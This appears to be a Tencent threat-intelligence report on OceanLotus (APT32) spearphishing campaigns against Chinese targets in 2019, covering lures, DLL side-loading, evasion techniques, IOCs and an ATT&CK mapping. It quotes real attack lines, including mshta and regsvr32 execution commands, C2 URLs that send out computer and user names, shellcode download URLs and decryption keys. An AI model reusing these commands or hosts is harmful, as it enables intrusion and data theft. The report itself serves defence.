@@ -1,0 +1,423 @@
+“海莲花”(腾O讯安全ceanLotus)
+我
+
+2019 年针对中国攻击活动汇总
+
+一、 概述
+
+"海莲花"（又名 APT32、OceanLotus），被认为来自越南的 APT 攻击组织，自 2012
+年活跃以来，一直针对中国大陆敏感目标进行攻击活动，是近几年来针对中国大陆进行攻击
+活动最活跃的 APT 攻击组织，甚至没有之一。
+腾讯安全御见威胁情报中心曾在 2019 年上半年发布过海莲花组织 2019 年第一季度攻
+击活动报告，而在报告发布之后一直到现在，我们监测到该组织针对中国大陆的攻击活动持
+续活跃。
+该组织的攻击目标众多且广泛，包括中国大陆的政府部门、海事机构、外交机构、大型
+国企、科研机构以及部分重要的私营企业等。并且我们监测到，有大量的国内目标被该组织
+攻击而整个内网都沦陷，且有大量的机密资料、企业服务器配置信息等被打包窃取走。
+此外我们发现，该组织攻击人员非常熟悉我国，对我国的时事、新闻热点、政府结构等
+都非常熟悉，如刚出个税改革时候，就立马使用个税改革方案做为攻击诱饵主题。此外钓鱼
+主题还包括绩效、薪酬、工作报告、总结报告等。
+而从攻击的手法上看，相对第一季度变化不是太大，但是依然有一些小的改进，包括攻
+击诱饵的种类、payload 加载、绕过安全检测等方面。而从整体的攻击方式来看，依然采
+用了使用电子邮件投递诱饵的方式，而一旦获取到一台机器的控制权限后，立即对整个内网
+进行扫描和平移渗透攻击等。这也进一步说明了 APT 攻击活动不会因为被曝光而停止或者
+有所减弱，只要攻击目标存在价值，攻击会越来越猛烈，对抗也会越来越激烈。
+
+二、 攻击特点
+
+2.1 钓鱼邮件的迷惑性
+
+海莲花组织擅长使用鱼叉攻击的方式，通过大量发送钓鱼邮件来投递恶意附件的方式进行攻
+击。整个 2019 年，持续对多个目标不断进行攻击，如下列钓鱼邮件：
+从邮件主题的来看，大部分邮件主题都非常本土化，以及贴近当时时事热点。邮件主题包括：
+《定-关于报送 2019 年度经营业绩考核目标建议材料的报告》、《组织部干部四处最新通
+知更新》、《关于 2019 下半年增加工资实施方案的请示（待审）》、《2019 年工作报告
+提纲 2(第四稿)》、《2019 年 5 月标准干部培训课程通知》等等。
+当然我们在 2019 年第一季度的报告中还提到使用敏感内容主题的钓鱼邮件，不过在之后的
+攻击中并未发现继续使用该类型的诱饵：
+此外，投递钓鱼邮件的账号均为网易邮箱，包括 126 邮箱和 163 邮箱，账号的样式为：名
+字拼音+数字@163（126）.com，如：
+Sun**@126.com、yang**@126.com、chen**@126.com、zhao**@163.com、
+reny**@163.com 等。
+
+2.2 诱饵类型的多样化
+
+海莲花组织所使用的诱饵类型众多，能想到的诱饵类型海莲花几乎都用过。除了我们在第一
+季度报告里提到的白加黑、lnk、doc 文档、WinRAR ACE 漏洞（CVE-2018-20250）的压
+缩包等类型外，之后的攻击中还新增了伪装为 word 图标的可执行文件、chm 文件等。
+可执行文件诱饵：
+Chm 诱饵：
+白加黑诱饵：
+带有宏的恶意 office 文档：
+恶意 lnk：
+带有 WinRAR ACE（CVE-2018-20250）漏洞的压缩包：
+
+2.3 载荷执行方式多变
+
+由于诱饵的多样化，载荷执行的方式也多变。此外第二阶段的加载方式同样方式众多。
+1、 直接执行可执行文件
+如该诱饵，伪装为 word 图标的可执行文件，并在文件描述里修改成了 Microsoft DOCX，
+用于迷糊被钓鱼者。执行恶意文件后，会释放诱饵文档 2019 年 5 月标准干部培训课程
+通知.docx，并且打开，让受害者以为都是开的就是 word 文档。而打开后的文档为模
+糊处理的文档，诱使受害者启用文档中的宏代码查看内容，结果导致恶意代码执行：
+2、 使用 rundll32 加载恶意 dll
+如某诱饵在执行后，会在 C:\Users\Administrator\AppData\Local\Microsoft 目录释
+放真正的恶意文件{1888B763-A56C-4D4B-895C-2092993ECCBA}.dll，然后使用
+rundll32 来执行该 dll："C:\Windows\system32\rundll32.exe"
+"C:\Users\ADMINI~1\AppData\Local\Microsoft\{1888B763-A56C-4D4B-895C-2
+092993ECCBA}.dll",Register
+3、 宏
+使用宏来执行载荷，且宏代码经过的混淆处理：
+4、 Office 内存执行恶意 shellcode
+使用宏代码，在 office 中直接解密 shellcode，在内存中创建线程执行：
+5、 dll 侧加载（白加黑）
+使用 dll 侧加载（DLL Side-Loading）技术来执行载荷，通俗的讲就是我们常说的白加
+黑执行。
+其中所使用的宿主文件对包括：
+白文件原名 黑 dll 文件名
+iTunesHelper.exe AppVersions.dll
+SGTool.exe Inetmib1.dll
+Rar.exe ldvptask.ocx
+GoogleUpdate.exe goopdate.dll
+360se.exe chrome_elf.dll
+Winword.exe wwlib.dll
+rekeywiz.exe mpr.dll
+wps.exe krpt.dll
+wechat.exe WeChatWin.dll
+6、 通过 com 技术执行
+通过 com 技术，把某恶意 dll 注册为系统组建来执行：
+7、 Chm 内嵌脚本
+Chm 执行后，会提示执行 ActiveX 代码：
+其脚本内容为：
+不过由于编码处理的问题，该 chm 打开后为乱码：
+而通过手动解压后，原始内容如下：
+8、 使用计划任务进行持久性攻击
+如上面的 chm 诱饵执行后，会在%AppData%\Roaming 下释放文件 bcdsrv.dll，然后
+创建名为 MonthlyMaintenance 的计划任务：
+命令行为：C:\Windows\System32\msiexec.exe -Y
+C:\Users\Administrator\AppData\Roaming\bcdsrv.dll
+bcdsrv.dll 为真正的恶意文件。
+9、 lnk 调用 mstha 执行
+该方法的详细分析在之前的《海莲花 2019 年第一季度攻击披露》：
+执行 lnk 后，会调用命令：C:\Windows\SysWOW64\mshta.exe
+http://api.baidu-json.com/feed/news.html，而 news.html 实际为一个 vbs 脚本文件。
+10、 使用 odbcconf.exe 加载文件：
+odbcconf.exe 为系统自带的一个文件，该文件可以用来执行 dll 文件，而由于宿主进程
+为系统文件，因此可以逃避一些安全软件的拦截：
+11、 WinRAR ACE（CVE-2018-20250）漏洞
+带有该漏洞的压缩包，可以构造为：解压后除了会解压出正常的文件外，再在启动目录
+（C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start
+Menu\Programs\Startup）释放一个自解压文件：
+该文件为一个自解压程序，等启动后，会释放一个
+{7026ce06-ee00-4ebd-b00e-f5150d86c13e}.ocx 文件，然后执行命令 regsvr32 /s /i
+{7026ce06-ee00-4ebd-b00e-f5150d86c13e}.ocx 执行：
+
+2.4 多重载荷攻击
+
+我们在最新的攻击活动中，我们首次发现海莲花使用了多重载荷的攻击。
+之前的攻击活动中，都是解密 shellcode 后，就直接执行最终的 RAT，如：
+而在最新的攻击活动中，我们发现，解密 shellcode 后，会先下载 shellcode 执行，如果下
+载不成功，再来加载预先设定好的 RAT：
+这样使得攻击活动更加的丰富和多样性，并且也可控。
+
+2.5 与安全软件对抗激烈
+
+海莲花也采用了多种对抗安全软件的方式，主要为：
+1、 dll 的侧加载（白加黑）
+该技术上面已详细描述，这里不再赘述。
+2、 使用系统文件来执行：
+如 odbcconf.exe
+3、 Office 中直接内存执行 shellcode
+上文也已经描述，这里也不再展开。
+4、 添加垃圾数据以扩充文件大小
+为了防止该文件被安全厂商收集，海莲花组织特意在某些文件的资源中添加大量的垃圾
+数据的方式以扩充文件大小。
+如某文件，填充垃圾数据后，文件大小高达 61.4 MB (64,480,256 字节)：
+5、 每台机器的第二阶段后门都是定制的
+每台机器的第二阶段后门文件都是根据当前机器的机器属性（如机器名）来加密定制的，
+因此每台机器上的文件 hash 都是不一样，且没这台机器的相关信息则无法解密。因此
+且即便被安全厂商捕捉，只要没有这台机器的相关遥感数据就无法解密出真正的
+payload。详细的见后文的"定制化后门"部分。
+6、 通信的伪装
+如某次攻击中 C2 的伪装：根据配置信息，可进行不同的连接和伪装，对 C2 进行拼装
+后再进行解析。拼接方式为（xxx 为配置 C2）：
+{rand}.xxx
+www6.xxx
+cdn.xxx
+api.xxx
+HTTP Header 的伪装：
+
+2.6 定制化的后门
+
+使用定制化的后门（主要是第二阶段下发的后门），是海莲花组织在 2019 年所使用的技术
+中最让人印象深刻的。该技术我们曾经在之前我们发表的 2019 年海莲花第一季度攻击报告
+中我们曾首次进行了曝光：针对每台机器下发的恶意文件，都使用被下发机器的相关机器属
+性（如机器名）进行加密，而执行则需要该部分信息，否则无法解密。因此每个下发的恶意
+文件都不一样，而且即便被安全厂商捕捉，只要没有该机器的相关遥感数据就无法解密出真
+正的 payload。
+该后门最终使用白加黑的方式来执行，包括 AdobeUpdate.exe+goopdate.dll、
+KuGouUpdate.exe+goopdate.dll、
+XGFileCheck.exe + goopdate.dll、SogouCloud.exe+ inetmib1.dll 等组合来执行。
+加密流程为：
+可以看到，某次针对国家某单位的攻击中，使用的密钥为：
+而该受害的用户名为 Cao**，可见该木马只专门为了感染该电脑而特意生成的。
+
+2.7 多种恶意软件的选择
+
+从我们的长期跟踪结果来看，海莲花组织使用的最终的恶意软件（无论是第一阶段后门还是
+第二阶段后门）主要有三种，分别是 CobaltStrike 的 beacon 木马、Denis 家族木马、修
+改版的 Gh0st。其中 CobaltStrike 和 Denis 使用的最多，而修改版的 Gh0st 则比较少见。
+CobaltStrike：
+Denis：
+修改版 Gh0st：
+
+2.8 持续的内网渗透
+
+通过钓鱼攻击攻陷一台主机后，海莲花还会不断的对被攻击的内网进行渗透攻击活动，以此
+来渗透到更多的内网机器：
+扫描：
+获取 hash：
+打包文件：
+此外，还会还会通过 powershell，创建计划任务来下载持久化的工具：
+最终的恶意文件为 goopdate.dll，跟上文所述的第二阶段下发后门一致。
+
+三、 可能存在的假旗活动
+
+在跟踪海莲花的过程中，我们还发现了一些跟海莲花活动类似的攻击：
+如:
+可以看出该批活动跟海莲花的类似：如关键字、使用白加黑等。
+而该文件最终的执行的恶意代码为两种：
+一种是 CobaltStrike 生成的 Beacon payload；
+另一种是 metasploit 生成的 block_reverse_http 的 paylaod。
+虽然 CobaltStrike 的 Beacon 木马海莲花组织一直在进行使用，但是之前未发现有
+metasploit 生成的 payload，这似乎跟之前的海莲花攻击活动又有些不一致。
+此外该批活动的 c2 都在中国境内（包括中国香港），这似乎跟之前的攻击活动也不大一样：
+虽然该波活动在极力的模仿海莲花的一些攻击行为，但是也依然存在不同的地方。因此暂未
+有更多的证据可以表明该活动归属于海莲花还是其他组织使用的假旗（false flag）活动。
+因此在这先不做定论，等待更多的证据和关联的依据。
+
+四、 总结
+
+海莲花组织是近年来针对中国大陆的敏感部门进行攻击的最活跃的 APT 组织，甚至没
+有之一。当然该组织也是被安全公司曝光的针对中国大陆的攻击活动报告最多的 APT 攻击
+组织。不过该组织并未有停手的迹象，反而不断的更新其技术特点和武器库，包括诱饵、
+payload、新的漏洞利用等，此外也有众多跟杀软的对抗手段，如自增文件大小、混淆方式、
+定制化的 payload 等。因此我们提醒相关部门和相关人员，切记提高安全意识，不要随意
+执行来历不明的邮件的附件，不要被钓鱼信息所蒙蔽。
+
+五、 安全建议
+
+1、 提升安全意识，不要打开来历不明的邮件的附件；除非文档来源可靠，用途明确，否则
+不要轻易启用 Office 的宏代码；
+2、 及时安装操作系统补丁和 Office 等重要软件的补丁；
+3、 使用杀毒软件防御可能得病毒木马攻击，对于企业用户，推荐使用腾讯御点终端安全管
+理系统。腾讯御点内置全网漏洞修复和病毒防御功能，可帮助企业用户降低病毒木马入
+侵风险；
+4、 推荐企业用户部署腾讯御界高级威胁检测系统及时捕捉黑客攻击。御界高级威胁检测系
+统，是基于腾讯安全反病毒实验室的安全能力、依托腾讯在云和端的海量数据，研发出
+的独特威胁情报和恶意检测模型系统。
+（https://s.tencent.com/product/gjwxjc/index.html）
+
+六、 附录
+
+6.2 IOCs
+
+MD5：
+e7920ac10815428de937f2fca076b94c
+4095b9682af13ca1e897ca9cc097ec69
+b96de3d0023542f8624b82b9773373e9
+5c5f8c80dcb3283afeb092cb0c13a58a
+c90c7abcee1d98a8663904d739185d16
+d249411f003d05c0cea012c11ba13716
+3489140891e67807c550aa91c67dc4ad
+22f8736bbc96c1a58ab07326d730a235
+dade969b00cbc4a0c1b58eeb0e740b63
+3c3b2cc9ff5d7030fb01496510ac75f2
+d604c33d6ec99a87a672b3202cb60fa7
+861fc5624fd1920e9d9cc7a236817dd7
+8e2b5b95980cf52e99acfa95f5e1570b
+3c8b20e428f8207b4324bb58f5d228
+a81424e973b310edd50aed37590f4b8a
+cf5d6d28c388edf58e55412983cf804a
+6b8bec74620fbf88263b48c5a11b682e
+9eb55481a0b5fcd255c8fb8de1042f88
+5c00063b11c4710fe5a5a1adaf208b12
+d30bc57624d233d94dc53a62908ef2df
+886d0dd67e4cf132a1aed84263d661e3
+2b3c5c831eb6b921ac128c4d44d70a7a
+1dfb41e5919af80c7d0fa163a90e21e5
+C&C：
+360skylar.host
+wechats.asis
+news.shangrilaexports.com
+clip.shangweidesign.com
+jcdn.jsoid.com
+libjs.inquirerjs.com
+baidu-search.net
+sys.genevrebreinl.com
+ad.ssageevrenue.com
+tel.caitlynwells.com
+us.melvillepitcairn.com
+upgrade.coldriverhardware.com
+cdnwebmedia.com
+43.251.100.20
+43.254.217.67
+114.118.80.233
+
+6.3 MITRE ATT&CK
+
+Tactic ID Name
+Initial Access T1193 Spearphishing Attachment
+Execution T1106 Execution through API
+T1129 Execution through Module Load
+T1203 Exploitation for Client Execution
+T1085 Rundll32
+T1204 User Execution
+T1223 Compiled HTML File
+T1053 Scheduled Task
+T1117 Regsvr32
+Persistence T1179 Hooking
+T1053 Scheduled Task
+T1060 Registry Run Keys / Startup Folder
+Defense Evasion T1107 File Deletion
+T1140 Deobfuscate/Decode Files or
+Information
+T1036 Masquerading
+T1112 Modify Registry
+T1027 Obfuscated Files or Information
+T1085 Rundll32
+T1099 Timestomp
+T1117 Regsvr32
+Credential Access T1179 Hooking
+T1056 Input Capture
+Discovery T1083 File and Directory Discovery
+T1046 Network Service Scanning
+T1135 Network Share Discovery
+T1057 Process Discovery
+T1082 System Information Discovery
+T1007 System Service Discovery
+Lateral Movement T1534 Internal Spearphishing
+Collection T1005 Data from Local System
+T1025 Data from Removable Media
+T1123 Audio Capture
+T1056 Input Capture
+T1113 Screen Capture
+T1115 Clipboard Data
+Command and Control T1043 Commonly Used Port
+T1094 Custom Command and Control Protocol
+T1024 Custom Cryptographic Protocol
+T1001 Data Obfuscation
+T1065 Uncommonly Used Port
+
+6.5 详细技术细节
+
+1、 样本组织部干部四处最新通知更新.doc（c90c7abcee1d98a8663904d739185d16）
+该样本里的宏代码经过混淆处理，对变量名函数名等进行简单命名后如下：
+在打开文档时触发木马恶意代码：
+判断是否 Win64 以及 VBA7 环境，是的话就释放木马文件%temp%\Windows Update.exe：
+并生成一个 lnk 文件到启动目录，从而在下次重启电脑后实现木马执行：
+如果非 Win64 以及 VBA7 环境，则解密出代码到内存中，创建线程执行：
+然后清空并保存文档：
+弹框等相关代码：
+Windows Update.exe 为在 win64 以及 VBA7 环境下释放的恶意文件，而释放出的文件与
+内存直接执行的恶意代码最终执行的恶意代码相同：
+最终的 RAT 依然为海莲花常用的 denis 木马：
+
+2、 本：定-关于报送 2019 年度经营业绩考核目标建议材料的报告.doc
+（3c3b2cc9ff5d7030fb01496510ac75f2）
+该样本同样使用宏来加载载荷，宏代码主要功能是从文档内置的形状对象中提取恶意代
+码解密后存为%temp%\~$doc-ad9b812a-88b2-454c-989f-7bb5fe98717e.ole（dll 文
+件），随后使用 regsvr32.exe 加载执行该 dll：
+该 dll 加载后，会判断参数，再执行一次 regsrv32.exe 加载自己：
+然后提取资源：
+资源为 2 个，一个 shellcode+一个伪装文档：
+ShellCode 解密后，主要包括两个功能函数，分别用于下载执行 ShellCode 和加载 Denis 远
+控木马，如果成功下载 shellcode 执行可能就不会再加载 denis 远控（主要看 shellcode
+执行是否返回）：
+下载 shellcode 并执行功能分析：内置域名 jcdn.jsoid.com：
+通过 ExpandEnvironmentStringsW 获取环境变量中的计算机名、用户名、操作系统等信
+息，最后拼接为完整的 url，访问下载 ShellCode：
+拼接后的 url 为：
+https://jcdn.jsoid.com/script/word.png?A=%COMPUTERNAME%&B=%USERNAME
+%&C=%OS%
+然后校验 ShellCode，并执行：
+如果下载不成功或者 hash 校验失败，则退出函数执行另一功能函数：加载 Denis 家族木马：
+
+3、 2019 年工作报告提纲 2(第四稿)（a34365a101c1fbafab98cf3d63f96658）
+该样本使用白加黑的方式执行：
+Mpr.dll 为加载的恶意文件。海莲花组织为了防止该文件被安全厂商收集，特意在该文件的
+资源中添加大量的垃圾数据的方式以扩充文件大小，使木马文件大小高达 61.4 MB
+(64,480,256 字节)：
+该文件的主要行为有：
+1） 从资源里释放文件：释放 805 号资源到文件夹中（名为：2019 年工作报告提纲 2(第四
+稿).docx），并打开该文件夹；释放 803 号资源到%LOCALAPPDATA%目录，该资源
+存放一个 PE 文件，命名为 HelpPaneProxy.dl（根据系统版本不同，也可能是
+HelpPaneProxy.dl）：
+打开后的文件夹为：
+2） 通过 com 技术执行添加注册表命令，将 HelpPaneProxy.dl 注册成系统组件：
+执行的命令：
+HelpPaneProxy.dl 的功能是解密内置的 shellcode1，并执行，与之前的海莲花版本类
+似。
+解密算法为 sha256+aes 内置密钥为：DD D8 74 EF 73 A8 25 06 A6 63 CB 80 F4 09
+C5 7D AF 63
+HelpPaneProxy.dl 同样使用资源中加垃圾数据的方式使自己达到 31.2 MB
+(32,793,600 字节)：
+Shellcode1 行为：
+从 https://baidu-search.net/download/comca.jpg 下载文件到内存中，并作为代码
+直接执行：
+Shellcode2 行为：（Comca.jpg）：
+Shellcode2 的功能主要是解密其后的 shellcode3，并创建线程执行 shellcode3：
+Shellcode3 行为：
+Shellcode3 功能是使用内置密钥解密其后的 payload，并校验 sha256 值，创建线程
+执行解密后的 payload：
+最终的 payload 是海莲花组织常用木马之一的 Cobalt Strike：
+
+4、 Consultancy Agreement with SMW.rar（cde957c80e5a3d0f0103a84385075251）
+和 Consultancy Agreement - C023-P - YCF (20190801).rar
+（3e37dcca40129157eabb9ab22362e50a）
+均使用的宿主为金山 WPS 的文件进行白加黑攻击，签名日期为 19 年 7 月 15：
+加载后，会从资源文件里释放伪装的诱饵文件：
+然后再从资源中取出 shellcode 并执行：
+但是，在 Shellcode 的处理上，两波攻击存在不同：
+攻击诱饵 Consultancy Agreement with SMW 执行后的 shellcode 解密后，直接为 denis
+木马：
+而攻击诱饵 Consultancy Agreement - C023-P - YCF (20190801) 的 shellcode 解密后，
+拥有两个主要函数，第一个函数用于下载 ShellCode 执行，如果下载不成功，则加载其后
+的 Denis RAT 木马：
+调用下载 ShellCode 执行的函数 17C，URL 地址如下：
+libjs.inquirerjs.com/script/pktth.com.png?A=%COMPUTERNAME%&B=%USERNA
+ME%
+不成功就继续执行 denis RAT：
+
+5、 inetmib1.dll（1ea0b813d7f42cfc9c16ad62bcc934e2）
+与之前的 goopdate.dll 一样，使用 hook LdrLoadDll 函数的方式跳转执行恶意代码：
+使用内置密钥 6F 4A 53 41 A1 74 7B 1F 25 B4 05 1D DD 62 A0 CF，使用 SHA256+AES
+解密第一层 shellcode：
+解密后直接 call 执行 shellcode：
+shellcode 的功能是解密 payload，同样使用 SHA256+AES 的方式进行解密，密钥使用和
+计算机名绑定的方式：前半部分密钥为 CAOPC 由黑客配置，后半部分密钥为受控计算机名，
+由此做到该木马与计算机绑定，只能在该计算机运行。
+如图所示为解密时用到的密钥：CAOPC + 计算机名
+解密后还会对 payload 进行校验，payload 的 sha256 值、前缀密码、payload 大小等信
+息保存在 payload 前。结构如下图所示：
+创建新线程执行 payload，payload 为若干个 nop 指令后跟一个具有自加载功能的 PE 文
+件：
+执行后从 PE 头跳转到 8A7A+处执行：
+8A7A+处代码为一段自加载 shellcode，其功能是在内存中展开 PE 文件并执行：
+下图所示为 PEloader 相关功能代码，主要是内存申请和按区段拷贝：
+下图所示为按导入表获取导入函数，值得注意的是，导入表被加密了，其自加载过程会先对
+导入表做解密后进行函数导入，解密方式为 XOR key，其中的 key 存放在 PE 头的
+NumberOfSymbols 字段中：
+完成展开后执行 PE 文件入口代码，值得注意的是入口代码地址被放到 PE 头的 LoaderFlags
+字段中：
+dll 执行后会解密出配置信息，配置信息 4096 字节，解密方式为 XOR 0x69：
+解密后的配置信息如下：主要有 C2、连接方式、Http 伪装头等信息：
+该恶意文件对 C2 进行了伪装：根据配置信息，可进行不同的连接和伪装，对 C2 进行拼装
+后再进行解析。拼接方式为（xxx 为配置 C2）：
+{rand}.xxx
+www6.xxx
+cdn.xxx
+api.xxx
+此外对 HTTP Header 也进行了伪装：
+最终的核心代码为 Cobalt Strike 远程平台，与之前使用的版本相比，多了几个功能分发函
+数，支持多达 91 中不同指令：
